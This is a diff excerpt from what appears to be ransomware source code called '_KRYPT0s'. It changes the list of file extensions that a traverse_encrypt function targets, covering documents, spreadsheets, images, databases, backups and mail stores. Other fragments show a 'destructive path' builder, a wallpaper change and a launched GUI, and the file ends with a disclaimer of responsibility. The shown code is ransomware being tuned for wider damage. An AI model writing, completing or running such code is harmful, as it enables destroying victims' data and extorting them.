@@ -203,10 +203,12 @@ def traverse_encrypt(drive, key):
     except:
         username = os.environ.get('USERNAME') # Try username through enviromental variables
     
-    extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.mp4', '.avi', 
-                '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv', '.dat', '.db', 
-                '.log', '.cfg', '.ini', '.py', '.bak', '.yml', '.yaml')
-    
+    extensions = (
+        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.png', '.jpg', 
+        '.jpeg', '.bmp', '.gif', '.mp3', '.wav', '.mp4', '.mov', '.zip', '.rar', '.7z', 
+        '.tar', '.bak', '.sql', '.xml', '.html', '.db', '.pst', '.docm', '.xlsm'
+    )
+
     def get_main_dirs(username, drive):
         # Construct dynamic destructive path
         main_dirs = [
@@ -355,7 +357,7 @@ def main():
     change_windows_wallpaper()
     launch_gui() 
 
-if __name__ == "__main__":
+if __name__ == "__main__":    
     main() # Launch _KRYPT0s
 
 # I AM NOT RESPONSIBLE FOR ANY MISDOINGS
